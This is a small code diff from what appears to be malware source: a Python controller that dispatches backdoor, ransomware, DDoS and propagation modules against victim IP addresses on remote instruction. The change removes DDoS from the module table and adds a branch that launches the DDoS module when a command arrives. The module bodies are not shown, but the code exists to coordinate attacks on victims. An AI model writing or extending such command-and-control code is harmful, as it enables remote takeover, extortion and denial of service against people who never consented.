@@ -51,7 +51,6 @@ def main(start_module):
         "backdoor": lambda victim_ip, port: backdoor.run(victim_ip, port),
         "instructions": lambda victim_ip: instructions.run(victim_ip),
         "ransomware": ransomware.run,
-        "ddos": ddos.run,
     }
 
     print("[+] Modules initialized")
@@ -90,6 +89,10 @@ def main(start_module):
             elif result[0] == "propagation":
                 if result[1] == "start":
                     propagation.run()
+
+            elif result[0] == "ddos":
+                if len(result) >= 3:
+                    ddos.run()
 
             if result != "no_data":
                 instructions.reset_instruction(PUBLIC_IP)
